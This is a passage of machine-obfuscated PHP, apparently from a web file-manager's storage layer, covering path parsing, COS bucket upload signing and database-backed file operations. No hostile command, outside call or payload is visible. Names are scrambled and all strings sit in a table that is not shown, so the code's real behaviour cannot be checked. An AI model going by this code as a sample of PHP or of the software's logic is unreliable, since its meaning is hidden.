$Dš§Ù¢–Ÿğ[1043] => !1, $Dš§Ù¢–Ÿğ[1042] => $Dš§Ù¢–Ÿğ[33]); if (is_array($Eœ›ñÑŞ£Š) && count($Eœ›ñÑŞ£Š) == 5) { $EõÛâÌ¸‚ã = $Dš§Ù¢–Ÿğ[1134] . $Eœ›ñÑŞ£Š[2] . $Dš§Ù¢–Ÿğ[323]; if (in_array($EõÛâÌ¸‚ã, $F¸©ÕÃ‚İÊ)) { $dğèÒƒºº[$Dš§Ù¢–Ÿğ[1043]] = $Eœ›ñÑŞ£Š[1]; $dğèÒƒºº[$Dš§Ù¢–Ÿğ[29]] = $EõÛâÌ¸‚ã; $dğèÒƒºº[$Dš§Ù¢–Ÿğ[1135]] = substr($EõÛâÌ¸‚ã, 1, -1); $dğèÒƒºº[$Dš§Ù¢–Ÿğ[385]] = $Eœ›ñÑŞ£Š[3]; } $dğèÒƒºº[$Dš§Ù¢–Ÿğ[1042]] = $Eœ›ñÑŞ£Š[4]; } goto Bâ»ëáƒìø; d‚áŸ®„ö: $Dš§Ù¢–Ÿğ =& $_SERVER[òÀöí]; $Bèƒ¡’ôö = self::clear($Bèƒ¡’ôö); $F¸©ÕÃ‚İÊ = array_values(self::typeList()); goto F…•–İ¿Ø”; e¾Şó‡™: } public static function clear($b´×§‹¸Ö) { goto D¤ìÎÚ…•; dèæÅ¯íÛ: return $b´×§‹¸Ö; goto BÛ…ñ‹´µö; B¬ÂÏèÊÒ: $D‡¥ÊÄ‰ÂÏ = $C…Æ‡¥…Åì[1136]; if (substr($b´×§‹¸Ö, 0, 3) == $C…Æ‡¥…Åì[1137]) { $b´×§‹¸Ö = substr($b´×§‹¸Ö, 3); } while (strstr($b´×§‹¸Ö, $D‡¥ÊÄ‰ÂÏ)) { $b´×§‹¸Ö = str_replace($D‡¥ÊÄ‰ÂÏ, $C…Æ‡¥…Åì[8], $b´×§‹¸Ö); } goto EàœÚ²Ó›À; EàœÚ²Ó›À: $b´×§‹¸Ö = preg_replace($C…Æ‡¥…Åì[1138], $C…Æ‡¥…Åì[8], $b´×§‹¸Ö); if ($b´×§‹¸Ö == $C…Æ‡¥…Åì[8]) { return $C…Æ‡¥…Åì[8]; } $b´×§‹¸Ö = rtrim($b´×§‹¸Ö, $C…Æ‡¥…Åì[8]); goto dèæÅ¯íÛ; D¤ìÎÚ…•: $C…Æ‡¥…Åì =& $_SERVER[òÀöí]; $b´×§‹¸Ö = str_replace(array($C…Æ‡¥…Åì[1016], $C…Æ‡¥…Åì[227]), $C…Æ‡¥…Åì[50], $b´×§‹¸Ö); $b´×§‹¸Ö = str_replace($C…Æ‡¥…Åì[96], $C…Æ‡¥…Åì[8], $b´×§‹¸Ö); goto B¬ÂÏèÊÒ; BÛ…ñ‹´µö: } public static function sourceID($DÒ¡æÇ„¼°) { $Bêõ›™–Úô =& $_SERVER[òÀöí]; $dÏÎôŒøŒÕ = self::parse($DÒ¡æÇ„¼°); if ($dÏÎôŒøŒÕ[$Bêõ›™–Úô[29]] !== self::KOD_SOURCE) { show_json(LNG($Bêõ›™–Úô[1139]), !1); } return $dÏÎôŒøŒÕ[$Bêõ›™–Úô[385]]; } public static function make($e§“öİß¶Á) { if (!$e§“öİß¶Á) { return !1; } return self::makePath(self::KOD_SOURCE, intval($e§“öİß¶Á)); } public static function makeShare($Cåæ¬æâ¤, $Dí­º›˜„¯) { return self::makePath(self::KOD_SHARE_ITEM, $Cåæ¬æâ¤, $Dí­º›˜„¯); } public static function makeFileTypePath($Cã¹Ã”Ôª¸) { return self::makePath(self::KOD_USER_FILE_TYPE, $Cã¹Ã”Ôª¸); } public static function makeFileTagPath($A‘ÎŒƒˆñ­) { return self::makePath(self::KOD_USER_FILE_TAG, $A‘ÎŒƒˆñ­); } public static function makePath($b­ë®›é²±, $c³‰·µ¼ÕÕ = '', $FÑÏ¥ñõÂø = '') { $aëç ŠÀœ =& $_SERVER[òÀöí]; $Bèª‰ÑÊ…ñ = substr($b­ë®›é²±, 1, -1); $FĞÛˆÙØ¾ = $aëç ŠÀœ[1140] . $Bèª‰ÑÊ…ñ . $aëç ŠÀœ[1141] . $c³‰·µ¼ÕÕ . $aëç ŠÀœ[1142]; $FĞÛˆÙØ¾ = $FÑÏ¥ñõÂø ? $FĞÛˆÙØ¾ . $FÑÏ¥ñõÂø . $aëç ŠÀœ[8] : $FĞÛˆÙØ¾; return $FĞÛˆÙØ¾; } public static function hashPath($e¤²æˆøİÒ) { $A°ßÙË =& $_SERVER[òÀöí]; $FÃÌŒÃíÍ£ = is_array($e¤²æˆøİÒ) ? $e¤²æˆøİÒ : IO::info($e¤²æˆøİÒ); $d†í…Ïèˆø = _get($FÃÌŒÃíÍ£, $A°ßÙË[1143], $A°ßÙË[33]); if (!$d†í…Ïèˆø) { $e´Ç‡³¿õƒ = KodIO::parse($FÃÌŒÃíÍ£[$A°ßÙË[75]]); if (!$e´Ç‡³¿õƒ[$A°ßÙË[29]]) { $d†í…Ïèˆø = IO::hashSimple($FÃÌŒÃíÍ£[$A°ßÙË[75]]); } } if (!$d†í…Ïèˆø) { $d†í…Ïèˆø = md5($FÃÌŒÃíÍ£[$A°ßÙË[75]] . $FÃÌŒÃíÍ£[$A°ßÙË[77]] . $FÃÌŒÃíÍ£[$A°ßÙË[83]]); } return $d†í…Ïèˆø; } public static function initSystemPath() { goto e‡è¹ÈÙ—À; f˜ëëº¨‘§: IOHistory::bindEvent(); goto CÔÒ­ƒÓÏ¶; F…·ØöÕ­¿: define($DÒÙáÍòÈŒ[1146], self::systemPath($DÒÙáÍòÈŒ[1147])); define($DÒÙáÍòÈŒ[1148], self::systemPath($DÒÙáÍòÈŒ[1149])); define($DÒÙáÍòÈŒ[1150], self::systemPath($DÒÙáÍòÈŒ[1151])); goto f˜ëëº¨‘§; e‡è¹ÈÙ—À: $DÒÙáÍòÈŒ =& $_SERVER[òÀöí]; if (defined($DÒÙáÍòÈŒ[1144])) { return; } define($DÒÙáÍòÈŒ[1144], self::systemPath($DÒÙáÍòÈŒ[1145])); goto F…·ØöÕ­¿; CÔÒ­ƒÓÏ¶: } public static function systemPath($e¬Š×Å“‡ˆ) { goto d£»½›ïë„; fâãå‘˜: if ($a÷™¹š‡‹„) { return $a÷™¹š‡‹„; } if ($e¬Š×Å“‡ˆ == $cäïØÆùÆ¤[1145]) { $a÷™¹š‡‹„ = self::make(Model($cäïØÆùÆ¤[778])->systemRootPathAdd($cäïØÆùÆ¤[1153])); } else { $a÷™¹š‡‹„ = self::systemPath($cäïØÆùÆ¤[1145]); $BàĞ¬¯¦‰ = self::sourceID($a÷™¹š‡‹„); $a÷™¹š‡‹„ = self::make(Model($cäïØÆùÆ¤[778])->mkdir($BàĞ¬¯¦‰, $e¬Š×Å“‡ˆ)); } Model($cäïØÆùÆ¤[1102])->set($Fˆ‚ÃÅïœÖ, $a÷™¹š‡‹„); goto EÖç‚„’†; d£»½›ïë„: $cäïØÆùÆ¤ =& $_SERVER[òÀöí]; $Fˆ‚ÃÅïœÖ = $cäïØÆùÆ¤[1152] . ucfirst($e¬Š×Å“‡ˆ); $a÷™¹š‡‹„ = Model($cäïØÆùÆ¤[1102])->get($Fˆ‚ÃÅïœÖ); goto fâãå‘˜; EÖç‚„’†: return $a÷™¹š‡‹„; goto eõÎË„øŠğ; eõÎË„øŠğ: } public static function systemFolder($BÄ”¹ÜåÔÑ) { $e²Ÿˆ˜ˆàå = IO_PATH_SYSTEM_SOURCE . $BÄ”¹ÜåÔÑ; $e†Ø„òÁö = Cache::get($e²Ÿˆ˜ˆàå); if (!$e†Ø„òÁö) { $dßÔÆ²„í = IO::infoFull($e²Ÿˆ˜ˆàå); if (!$dßÔÆ²„í) { $e†Ø„òÁö = IO::mkdir($e²Ÿˆ˜ˆàå, REPEAT_SKIP); } else { $e†Ø„òÁö = $dßÔÆ²„í[$_SERVER[òÀöí][75]]; } Cache::set($e²Ÿˆ˜ˆàå, $e†Ø„òÁö, 3600 * 10); } return $e†Ø„òÁö; } public static function defaultDriver() { return Model($_SERVER[òÀöí][722])->defaultDriver(); } public static function defaultIO() { $fÅ³ù¥¿«´ =& $_SERVER[òÀöí]; $F‘Ä‘æ‚µ = self::defaultDriver(); return $fÅ³ù¥¿«´[1154] . $F‘Ä‘æ‚µ[$fÅ³ù¥¿«´[385]] . $fÅ³ù¥¿«´[1142]; } public static function defaultDriverInit() { static $BÓç¤”˜ßÑ = false; if ($BÓç¤”˜ßÑ) { return $BÓç¤”˜ßÑ; } $BÓç¤”˜ßÑ = IO::init(self::defaultIO()); return $BÓç¤”˜ßÑ; } public static function fileTypeList() { $bö’Ÿ›Á½ =& $_SERVER[òÀöí]; $f”´‰§‘ Š = $GLOBALS[$bö’Ÿ›Á½[6]][$bö’Ÿ›Á½[1155]]; foreach ($f”´‰§‘ Š as $f—Âå½ğ => $c×§Ø×“È) { $eè¤³ÙŠÎ¹ = $bö’Ÿ›Á½[1156] . $f—Âå½ğ; $B¹µù—çİ = LNG($eè¤³ÙŠÎ¹); if ($eè¤³ÙŠÎ¹ != $B¹µù—çİ) { $f”´‰§‘ Š[$f—Âå½ğ][$bö’Ÿ›Á½[28]] = $B¹µù—çİ; } } return $f”´‰§‘ Š; } public static function transferType($bŠºâˆÆ›, $d÷òáÌ¬»Û) { goto eö—¥†Ÿñ; eö—¥†Ÿñ: $F· ÕœÓ ó =& $_SERVER[òÀöí]; $C´ÌË›£š¼ = self::driverType($bŠºâˆÆ›); $båÕÍÅ™ÑÔ = self::driverType($d÷òáÌ¬»Û); goto B¢±—æóŞÜ; AÖ×™›„‚ì: return $F· ÕœÓ ó[1159]; goto fä¹÷¡Ïâò; B¢±—æóŞÜ: if ($C´ÌË›£š¼[$F· ÕœÓ ó[29]] == $båÕÍÅ™ÑÔ[$F· ÕœÓ ó[29]] && $C´ÌË›£š¼[$F· ÕœÓ ó[1157]] == $båÕÍÅ™ÑÔ[$F· ÕœÓ ó[1157]]) { return $F· ÕœÓ ó[1158]; } if ($C´ÌË›£š¼[$F· ÕœÓ ó[29]] == $F· ÕœÓ ó[811] && $båÕÍÅ™ÑÔ[$F· ÕœÓ ó[29]] == $F· ÕœÓ ó[105]) { return $F· ÕœÓ ó[1072]; } if ($C´ÌË›£š¼[$F· ÕœÓ ó[29]] == $F· ÕœÓ ó[105] && $båÕÍÅ™ÑÔ[$F· ÕœÓ ó[29]] == $F· ÕœÓ ó[811]) { return $F· ÕœÓ ó[106]; } goto AÖ×™›„‚ì; fä¹÷¡Ïâò: } public static function driverType($BŒ¯âà¿¬ó) { goto dÄ«ìÂ±Ãõ; f¶è¥Ç«: if ($FÊö†¤Ì¿È == $bğŒïŒ§æÄ[713] || $FÊö†¤Ì¿È == $bğŒïŒ§æÄ[1161] || $FÊö†¤Ì¿È == $bğŒïŒ§æÄ[1162]) { $BŒ¯âà¿¬ó = self::defaultDriverInit(); } else { if ($FÊö†¤Ì¿È == $bğŒïŒ§æÄ[1079] || $FÊö†¤Ì¿È == $bğŒïŒ§æÄ[1163]) { $BŒ¯âà¿¬ó = IO::init($BŒ¯âà¿¬ó->pathParse[$bğŒïŒ§æÄ[1026]]); } } $FÊö†¤Ì¿È = str_replace($bğŒïŒ§æÄ[1160], $bğŒïŒ§æÄ[33], strtolower($BŒ¯âà¿¬ó->getType())); if ($FÊö†¤Ì¿È == $bğŒïŒ§æÄ[105]) { return array($bğŒïŒ§æÄ[29] => $bğŒïŒ§æÄ[105], $bğŒïŒ§æÄ[1157] => $bğŒïŒ§æÄ[33], $bğŒïŒ§æÄ[75] => $F’æ‰ÎĞ­); } goto dñõ¬õŒÄ; dÄ«ìÂ±Ãõ: $bğŒïŒ§æÄ =& $_SERVER[òÀöí]; $F’æ‰ÎĞ­ = $BŒ¯âà¿¬ó->path; $FÊö†¤Ì¿È = str_replace($bğŒïŒ§æÄ[1160], $bğŒïŒ§æÄ[33], strtolower($BŒ¯âà¿¬ó->getType())); goto f¶è¥Ç«; dñõ¬õŒÄ: return array($bğŒïŒ§æÄ[29] => $bğŒïŒ§æÄ[811], $bğŒïŒ§æÄ[1157] => $BŒ¯âà¿¬ó->pathDriver, $bğŒïŒ§æÄ[75] => $F’æ‰ÎĞ­); goto A‚¿±×µá•; A‚¿±×µá•: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($EÆÏÔ¼Êëå) { parent::__construct($EÆÏÔ¼Êëå); $this->signatureVersion($_SERVER[òÀöí][210]); } public function uploadFormData($B£Ô¥¬ “½, $B¾Ğ®ó¯È‹ = 3600) { goto A¯ŒÇÍ»¸; A¯ŒÇÍ»¸: $AÀ‘˜ÓËŒß =& $_SERVER[òÀöí]; $e©‡›¶‚”ê = $AÀ‘˜ÓËŒß[191]; $A´¼Í‰‹ë = $AÀ‘˜ÓËŒß[228]; goto d­æ¹âØÊ„; FÒ‡­°‘: $b¶öÖŒªŸå = array($AÀ‘˜ÓËŒß[1166] => $bÄÔ’¿ïÛ¶, $AÀ‘˜ÓËŒß[1167] => array(array($AÀ‘˜ÓËŒß[1168] => $e©‡›¶‚”ê), array($AÀ‘˜ÓËŒß[1169] => $this->bucket), array($AÀ‘˜ÓËŒß[1170], $AÀ‘˜ÓËŒß[1171], $AÀ‘˜ÓËŒß[33]), array($AÀ‘˜ÓËŒß[1172] => $A·˜¯ÊçÕ´), array($AÀ‘˜ÓËŒß[1173] => $A´¼Í‰‹ë), array($AÀ‘˜ÓËŒß[1174] => $this->accessKey), array($AÀ‘˜ÓËŒß[1175] => $cÙ‘‡¼î‡”))); $b¶öÖŒªŸå = json_encode($b¶öÖŒªŸå); $Dº´§£óÂ· = hash_hmac($AÀ‘˜ÓËŒß[228], $cÙ‘‡¼î‡”, $this->secret); goto bÄòõŠ’Œ; d­æ¹âØÊ„: $A·˜¯ÊçÕ´ = $AÀ‘˜ÓËŒß[1164]; $bÄÔ’¿ïÛ¶ = gmdate($AÀ‘˜ÓËŒß[1165], time() + $B¾Ğ®ó¯È‹); $cÙ‘‡¼î‡” = (string) time() . $AÀ‘˜ÓËŒß[67] . (string) (time() + $B¾Ğ®ó¯È‹); goto FÒ‡­°‘; bÄòõŠ’Œ: $e¼¶òŞ¼™Š = sha1($b¶öÖŒªŸå); $d®¬ÍÜÓ† = hash_hmac($AÀ‘˜ÓËŒß[228], $e¼¶òŞ¼™Š, $Dº´§£óÂ·); $e¾šŞÛ¸ğ = array($AÀ‘˜ÓËŒß[1168] => $e©‡›¶‚”ê, $AÀ‘˜ÓËŒß[1172] => $A·˜¯ÊçÕ´, $AÀ‘˜ÓËŒß[1176] => base64_encode($b¶öÖŒªŸå), $AÀ‘˜ÓËŒß[1173] => $A´¼Í‰‹ë, $AÀ‘˜ÓËŒß[1174] => $this->accessKey, $AÀ‘˜ÓËŒß[1177] => $cÙ‘‡¼î‡”, $AÀ‘˜ÓËŒß[1178] => $d®¬ÍÜÓ†, $AÀ‘˜ÓËŒß[175] => $this->getHost()); goto C³Ò®Ö…; C³Ò®Ö…: return $e¾šŞÛ¸ğ; goto a„•Š¸ÁÈÁ; a„•Š¸ÁÈÁ: } public function fileOutLink($f³Åô»×åÖ) { $dˆÖÆĞ¯ä =& $_SERVER[òÀöí]; if (substr($f³Åô»×åÖ, 0, 7) == $dˆÖÆĞ¯ä[1179]) { $f³Åô»×åÖ = $dˆÖÆĞ¯ä[1180] . substr($f³Åô»×åÖ, 7); } header($dˆÖÆĞ¯ä[158] . $f³Åô»×åÖ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($C­Ô®å¤¬œ) { $this->pathParse = $C­Ô®å¤¬œ; $this->model = Model($_SERVER[òÀöí][1181]); } public function getPath($D¶Ï…çà‡Â) { return trim($D¶Ï…çà‡Â, $_SERVER[òÀöí][8]); } public function pathFather($a„×™µ‘›‡) { $a‚Ù»Ôùª = $this->parse($a„×™µ‘›‡); $a‚Ù»Ôùª = $this->infoSimple($a„×™µ‘›‡); return $a‚Ù»Ôùª ? $a‚Ù»Ôùª[$_SERVER[òÀöí][479]] : !1; } public function pathThis($FÑä«Àš­¬) { $dˆ‡ŞŸ…·Æ = $this->infoSimple($FÑä«Àš­¬); return $dˆ‡ŞŸ…·Æ ? $dˆ‡ŞŸ…·Æ[$_SERVER[òÀöí][28]] : !1; } public function getPathOuter($fê“Æ§å«) { if (!$fê“Æ§å«) { return $fê“Æ§å«; } $EâÓÌ¦ãÛ = $this->parse($fê“Æ§å«); return KodIO::make($EâÓÌ¦ãÛ[$_SERVER[òÀöí][385]]); } public function copyFolderFromIO($A¼ó¢ˆŠÅ•, $eòğùÈè¹Â, $a—ÇŸ‚‘ç¶, $d†‡æÓÊ®, $cŠ²Œ¶ï¤Œ) { $eõ–Øôëğ‰ = $this->model->copyFolderFromIO($A¼ó¢ˆŠÅ•, $eòğùÈè¹Â, $a—ÇŸ‚‘ç¶, $d†‡æÓÊ®, $cŠ²Œ¶ï¤Œ); return KodIO::make($eõ–Øôëğ‰); } public function isParentOf($D×ùí†ÁÊ, $aéŠÙÊˆ’ª) { return $this->model->isParentOf($D×ùí†ÁÊ, $aéŠÙÊˆ’ª); } public function mkfile($e™æÔÍé¯™, $FªØ¡ÔçÇ = '', $EÅÕÍÌŠØ¢ = REPEAT_RENAME) { $DÎØ¹‹šƒ =& $_SERVER[òÀöí]; $bÚ™Î£Ğ§ = $this->parse($e™æÔÍé¯™); $e™æÔÍé¯™ = $bÚ™Î£Ğ§[$DÎØ¹‹šƒ[385]]; for ($d›¼İ‡Œç = 0; $d›¼İ‡Œç < count($bÚ™Î£Ğ§[$DÎØ¹‹šƒ[1182]]); $d›¼İ‡Œç++) { $C­ÆôÕØ‚Ÿ = $bÚ™Î£Ğ§[$DÎØ¹‹šƒ[1182]][$d›¼İ‡Œç]; if ($d›¼İ‡Œç == count($bÚ™Î£Ğ§[$DÎØ¹‹šƒ[1182]]) - 1) { $e™æÔÍé¯™ = $this->model->mkfile($e™æÔÍé¯™, $C­ÆôÕØ‚Ÿ, $FªØ¡ÔçÇ, $EÅÕÍÌŠØ¢); break; } $e™æÔÍé¯™ = $this->model->mkdir($e™æÔÍé¯™, $C­ÆôÕØ‚Ÿ, REPEAT_SKIP); } return $this->getPathOuter($e™æÔÍé¯™); } public function mkdir($A’¸Òøîã”, $DŒ¶ˆ³‰Å° = REPEAT_SKIP) { $eßŞªçèÇ =& $_SERVER[òÀöí]; $bÅ“¡˜É = $this->parse($A’¸Òøîã”); $A’¸Òøîã” = $bÅ“¡˜É[$eßŞªçèÇ[385]]; for ($d‚£ÏÜÒ§‚ = 0; $d‚£ÏÜÒ§‚ < count($bÅ“¡˜É[$eßŞªçèÇ[1182]]); $d‚£ÏÜÒ§‚++) { $d…ÅŸ‡øÍ = $bÅ“¡˜É[$eßŞªçèÇ[1182]][$d‚£ÏÜÒ§‚]; $A’¸Òøîã” = $this->model->mkdir($A’¸Òøîã”, $d…ÅŸ‡øÍ, $DŒ¶ˆ³‰Å°); } return $this->getPathOuter($A’¸Òøîã”); } public function copyFile($Aø‡¤àÒë¹, $a×›¹†‚ã£, $a†¶ˆìŞÒ = REPEAT_REPLACE) { $d×í÷…İ =& $_SERVER[òÀöí]; $eå§ëµñ™ = $this->parse($a×›¹†‚ã£); $c¶ˆ‹ÃÏ = $this->model->copy($Aø‡¤àÒë¹, $eå§ëµñ™[$d×í÷…İ[385]], $a†¶ˆìŞÒ, $eå§ëµñ™[$d×í÷…İ[75]]); return $c¶ˆ‹ÃÏ ? $this->getPathOuter($c¶ˆ‹ÃÏ) : !1; } public function moveFile($AØ³ñÕÖ, $dí¢‡¥Ò¿Ô, $f¸¸ğĞ¦ö = REPEAT_REPLACE) { $bÒï³˜ëÊÙ =& $_SERVER[òÀöí]; $b©À¦Ãˆ„Ò = $this->parse($dí¢‡¥Ò¿Ô); $cÆ¶À½œÕ = $this->model->move($AØ³ñÕÖ, $b©À¦Ãˆ„Ò[$bÒï³˜ëÊÙ[385]], $f¸¸ğĞ¦ö, $b©À¦Ãˆ„Ò[$bÒï³˜ëÊÙ[75]]); return $cÆ¶À½œÕ ? $this->getPathOuter($cÆ¶À½œÕ) : !1; } public function copy($aÃºî£°†ë, $d´äšòã¬©, $aä»™‚ÊóÕ = REPEAT_REPLACE) { $b²¶•‹Æô = $this->parse($d´äšòã¬©); $a©‚Ô»ğ„­ = $this->model->copy($aÃºî£°†ë, $b²¶•‹Æô[$_SERVER[òÀöí][385]], $aä»™‚ÊóÕ); return $a©‚Ô»ğ„­ ? $this->getPathOuter($a©‚Ô»ğ„­) : !1; } public function moveSameAllow() { } public function move($BŠí´¬å„, $CäÑËÊ˜è”, $Dñ¬¦ÑÈÇ´ = REPEAT_REPLACE) { $Eó°„‡‚Õ = $this->parse($CäÑËÊ˜è”); $CÃÀ±æèÆ† = $this->model->move($BŠí´¬å„, $Eó°„‡‚Õ[$_SERVER[òÀöí][385]], $Dñ¬¦ÑÈÇ´); return $CÃÀ±æèÆ† ? $this->getPathOuter($CÃÀ±æèÆ†) : !1; } public function remove($C­‡Å…Óª, $bµ¹ÒŸ¶î¸ = true) { return $this->model->remove($C­‡Å…Óª, $bµ¹ÒŸ¶î¸); } public function rename($aİªšš¾ßÑ, $A‘Íõ†‰É«) { $EÓ‰â‚½è = $this->model->rename($aİªšš¾ßÑ, $A‘Íõ†‰É«); return $EÓ‰â‚½è ? $this->getPathOuter($aİªšš¾ßÑ) : $EÓ‰â‚½è; } public function size($fõ¤í®ÆŒÄ) { $bô±äµ«¶Œ = $this->infoSimple($fõ¤í®ÆŒÄ); return $bô±äµ«¶Œ ? $bô±äµ«¶Œ[$_SERVER[òÀöí][77]] : 0; } public function infoSimple($Fñòª­Š––) { return $this->model->sourceInfo($Fñòª­Š––); } public function info($B×Ÿê¢ˆ¸¾) { return $this->infoParse($B×Ÿê¢ˆ¸¾); } public function infoAuth($dÕäĞ„…á) { return $this->infoParse($dÕäĞ„…á, !1, !0); } public function infoWithChildren($EÉˆçõ´Í) { return $this->infoParse($EÉˆçõ´Í, !0); } protected function infoParse($CƒœøÔ‡¶á, $bÈ¹„ÉË—î = false, $fŠ´‰ÃÈó = false) { if (!$bÈ¹„ÉË—î) { return $this->model->pathInfo($CƒœøÔ‡¶á, $fŠ´‰ÃÈó); } return $this->model->pathInfoMore($CƒœøÔ‡¶á); } public function infoFull($a–ÖÈˆÚ„ä) { $a‰£°µ˜ßÏ =& $_SERVER[òÀöí]; $d‹ÂÅ£ß‰ñ = explode($a‰£°µ˜ßÏ[8], $a–ÖÈˆÚ„ä); $dÈ¾“ƒÓ‹ = implode($a‰£°µ˜ßÏ[8], array_splice($d‹ÂÅ£ß‰ñ, 1)); return $this->model->pathInfoByPath($d‹ÂÅ£ß‰ñ[0], $dÈ¾“ƒÓ‹); } public function hashSimple($F­‡‚ƒí‘‰) { $CØ†â°…Íï =& $_SERVER[òÀöí]; $FîÒá¬‹ƒ = $this->infoWithChildren($F­‡‚ƒí‘‰); return $FîÒá¬‹ƒ[$CØ†â°…Íï[163]][$CØ†â°…Íï[170]]; } public function hashMd5($FÈêï›‘) { $eÃ°™·ã…¼ =& $_SERVER[òÀöí]; $cè˜“ëÎÃ = $this->infoWithChildren($FÈêï›‘); return $cè˜“ëÎÃ[$eÃ°™·ã…¼[163]][$eÃ°™·ã…¼[169]]; } public function exist($FêÛœ•—É ) { $CªãŒ†ÌÆ =& $_SERVER[òÀöí]; $c ·îŒ¬¤¨ = $this->parse($FêÛœ•—É ); if (!$c ·îŒ¬¤¨[$CªãŒ†ÌÆ[75]]) { return $this->isFile($FêÛœ•—É ) || $this->isFolder($FêÛœ•—É ); } $b£Œ¬×ÃÇ† = array($CªãŒ†ÌÆ[386] => $c ·îŒ¬¤¨[$CªãŒ†ÌÆ[385]], $CªãŒ†ÌÆ[28] => $c ·îŒ¬¤¨[$CªãŒ†ÌÆ[75]]); $cÖèÆ—âñ« = $this->model->where($b£Œ¬×ÃÇ†)->find(); return $cÖèÆ—âñ« ? !0 : !1; } public function isFile($BÀĞÚä‰÷) { $DÂ£ª÷­Ø“ =& $_SERVER[òÀöí]; $BÊö‚ó¯‹ = $this->infoSimple($BÀĞÚä‰÷); return $BÊö‚ó¯‹ && $BÊö‚ó¯‹[$DÂ£ª÷­Ø“[388]] == $DÂ£ª÷­Ø“[86] ? !1 : !0; } public function isFolder($c…†Å»‚İ) { $BÖÛƒ¤ƒù =& $_SERVER[òÀöí]; $E‹óÌ˜á‡Ÿ = $this->infoSimple($c…†Å»‚İ); return $E‹óÌ˜á‡Ÿ && $E‹óÌ˜á‡Ÿ[$BÖÛƒ¤ƒù[388]] == $BÖÛƒ¤ƒù[86] ? !0 : !1; } public function listPath($A¯ÇËÄ¼‚, $eÀÓ¸è’…° = false) { $C£œ±ÆÁì =& $_SERVER[òÀöí]; if ($A¯ÇËÄ¼‚ == $C£œ±ÆÁì[33]) { return !1; } $fëÊÍ¯¦µ§ = array($C£œ±ÆÁì[386] => $A¯ÇËÄ¼‚); if ($eÀÓ¸è’…°) { return $this->model->listSource($fëÊÍ¯¦µ§, -1); } return $this->model->listSource($fëÊÍ¯¦µ§); } public function has($A‚òåìµÉŠ, $BœÀÉğ¨‚í = false, $fêòàøÔÖ¿ = null) { $fç¸ÃóÈ´° =& $_SERVER[òÀöí]; $fÂŞ–µ³ä– = $this->infoWithChildren($A‚òåìµÉŠ); if ($BœÀÉğ¨‚í) { return array($fç¸ÃóÈ´°[202] => $fÂŞ–µ³ä–[$fç¸ÃóÈ´°[202]], $fç¸ÃóÈ´°[201] => $fÂŞ–µ³ä–[$fç¸ÃóÈ´°[201]]); } return $fêòàøÔÖ¿ ? $fÂŞ–µ³ä–[$fç¸ÃóÈ´°[202]] : $fÂŞ–µ³ä–[$fç¸ÃóÈ´°[201]]; } public function listAll($b²öÈÅ¸°›) { $Dµ¾Á‘‚„Ù = IO::info($this->pathParse[$_SERVER[òÀöí][75]]); if (!$Dµ¾Á‘‚„Ù) { return array(); } return $this->model->listAll($b²öÈÅ¸°›); } public function getContent($A¸ö¹¹¤­Œ) { return $this->model->getContent($A¸ö¹¹¤­Œ); } public function setContent($E¢Ø“Š’×, $B¯¡¹Ÿ–¸ö = '') { return $this->model->setContent($E¢Ø“Š’×, $B¯¡¹Ÿ–¸ö); } public function fileSubstr($AàÂ²³ªá°, $Aµ½°ÙÖŸ¼, $fòâòÓÙ) { return $this->model->fileSubstr($AàÂ²³ªá°, $Aµ½°ÙÖŸ¼, $fòâòÓÙ); } public function download($BÒÕ¢±­Œ¶, $aÛ„Ë×Ø–‡ = '') { $fé–’¦Ğ‰ƒ = get_path_father($aÛ„Ë×Ø–‡); $E’ôÊİÎšƒ = get_path_this($aÛ„Ë×Ø–‡); $A ØôÓ¼Ô„ = $this->model->fileInfoGet($BÒÕ¢±­Œ¶); $aİ¸Ş³¢· = IO::copy($A ØôÓ¼Ô„[$_SERVER[òÀöí][75]], $fé–’¦Ğ‰ƒ, !1, $E’ôÊİÎšƒ); return $aİ¸Ş³¢·; } public function setModifyTime($Açîµíï„ò, $c†÷Ú–Ï• = '') { $this->model->metaSet($Açîµíï„ò, $_SERVER[òÀöí][1183], $c†÷Ú–Ï•); } public function upload($a›×í†Š´±, $e…Šîİó¢Û, $e ®ãÈ„Áç = false, $F‰ãÈ¸ŠÕÈ = REPEAT_REPLACE) { $A¿‡Ò©ƒ© =& $_SERVER[òÀöí]; $bÆ˜õ‹ÅŒ‡ = $this->parse($a›×í†Š´±); $Bù²ôìí§Ã = $this->model->addFile($bÆ˜õ‹ÅŒ‡[$A¿‡Ò©ƒ©[385]], $e…Šîİó¢Û, $bÆ˜õ‹ÅŒ‡[$A¿‡Ò©ƒ©[75]], $e ®ãÈ„Áç, $F‰ãÈ¸ŠÕÈ); return $this->getPathOuter($Bù²ôìí§Ã); } public function uploadFileByID($B‹½ßÒÒç, $CÇ’ Ğ£›, $F¨ëÜÁ™õ) { $dĞ¥º¿‰¨Á =& $_SERVER[òÀöí]; $EŸ¼Ø×êµ× = $this->parse($B‹½ßÒÒç); $DÖ ÔÖŠğé = $this->model->addFileByFileID($EŸ¼Ø×êµ×[$dĞ¥º¿‰¨Á[385]], $CÇ’ Ğ£›, $EŸ¼Ø×êµ×[$dĞ¥º¿‰¨Á[75]], $F¨ëÜÁ™õ); return $this->getPathOuter($DÖ ÔÖŠğé); } public function addFileByRemote($d¡¶‘¿ç„ñ, $C†®µÕ¿Í, $E¶£’ã ¾‰ = array(), $a©Ú±„±óŠ = '', $D¹‰ˆÏ¸¹£) { $d½¦†—ë» =& $_SERVER[òÀöí]; $dêÎğ•Ä‘ = $this->parse($d¡¶‘¿ç„ñ); $a©Ú±„±óŠ = empty($a©Ú±„±óŠ) ? $dêÎğ•Ä‘[$d½¦†—ë»[75]] : $a©Ú±„±óŠ; $F‡ãîÊ¸© = $this->model->addFileByRemote($dêÎğ•Ä‘[$d½¦†—ë»[385]], $C†®µÕ¿Í, $a©Ú±„±óŠ, $E¶£’ã ¾‰, $D¹‰ˆÏ¸¹£); return $this->getPathOuter($F‡ãîÊ¸©); } public function uploadLink($Bê®ò¯¦æ, $c¨¿ƒÁÖ•± = 0) { $c“ÑìÙÈš =& $_SERVER[òÀöí]; $C…İÖó¬„§ = $this->parse($Bê®ò¯¦æ); $Bê®ò¯¦æ = Model($c“ÑìÙÈš[560])->createFileName($C…İÖó¬„§[$c“ÑìÙÈš[75]]); $EáéŸ’’İ¯ = IO::uploadLink($Bê®ò¯¦æ, $c¨¿ƒÁÖ•±); return $EáéŸ’’İ¯; } public function fileNameAuto($eëñÊ£ô•, $EÃÀ÷Ñà, $D¾¼´¨“á‰ = REPEAT_REPLACE, $fÃ‘¾¬ø = false) { 